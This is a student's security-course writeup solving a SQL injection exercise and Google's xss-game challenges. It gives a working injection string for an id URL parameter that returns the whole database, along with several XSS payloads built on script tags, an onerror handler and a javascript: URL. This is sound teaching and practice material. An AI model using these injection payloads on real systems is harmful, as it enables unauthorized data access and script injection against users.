Writeup 10 - Crypto II
=====

Name: Tumie Hurd  
Section: 0101  

I pledge on my honor that I have not given or received any unauthorized assistance on this assignment or examination.  

Digital acknowledgement of honor pledge: Tumie Hurd  

## Assignment 10 Writeup   

### Part 1 (70 Pts)   
I knew that I would need to use SQL injection for this part, but I did not see any input fields.  I figured that database queries were being run with the id parameter in the url.  I began experimenting with different injections and I was able to return the entire database with the command ```/item?id=0' or '1=1```  

The flag that I found was ```CMSC38R-{y0U-are_the_5ql_n1nja}```  
  
### Part 2 (30 Pts)  

Challege #1   
  
```<script>alert('Test')</script>```  
  
Challenge #2  
```<img src='Testing' onerror=alert("TEST")>```  
Challenge #3  
```https://xss-game.appspot.com/level3/frame#1'><script>alert('')</script>```  
Challenge #4  
```');alert('Test```   
Challegne #5  
```https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert('')```  
Challeneg #6  
``` ```  
    
